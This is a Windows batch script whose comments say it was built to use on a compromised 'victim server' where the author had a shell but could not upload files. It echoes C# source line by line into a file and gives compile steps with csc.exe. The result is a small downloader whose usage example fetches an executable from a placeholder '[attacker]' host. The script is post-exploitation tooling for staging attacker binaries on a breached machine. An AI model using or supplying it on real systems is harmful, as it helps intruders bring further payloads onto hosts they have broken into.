rem This is a batch script that simply echos the C# code to cswget.cs.
rem Since I had a shell but no way to upload to the victim server I had
rem to copy each line below into my shell in order to create cswget.cs.
rem When you have cswget.cs you will need to locate csc.exe for your  
rem version of .NET.
rem (e.g. C:\windows\microsoft.net\framework\v2.0.50727.csc.exe)
rem Then you can compile with csc.exe /out:cswget.exe cswget.cs
echo using System;>>cswget.cs
echo using System.Net;>>cswget.cs
echo.>>cswget.cs
echo class WGet>>cswget.cs
echo {>>cswget.cs
echo     static void Main(string[] args)>>cswget.cs
echo     {>>cswget.cs
echo         if (args.Length == 1)>>cswget.cs
echo         {>>cswget.cs
echo             string filename = null;>>cswget.cs
echo             Uri _uri = new Uri(args[0]);>>cswget.cs
echo             filename = _uri.Segments[_uri.Segments.Length - 1];>>cswget.cs
echo             Console.WriteLine(filename);>>cswget.cs
echo             WebClient webClient = new WebClient();>>cswget.cs
echo             webClient.DownloadFile(args[0], filename);>>cswget.cs
echo         }>>cswget.cs
echo         if (args.Length == 0)>>cswget.cs
echo         {>>cswget.cs
echo             Console.WriteLine("Usage:\r\n  e.g. cswget.exe http://[attacker]/wget.exe");>>cswget.cs
echo         }>>cswget.cs
echo     }>>cswget.cs
echo }>>cswget.cs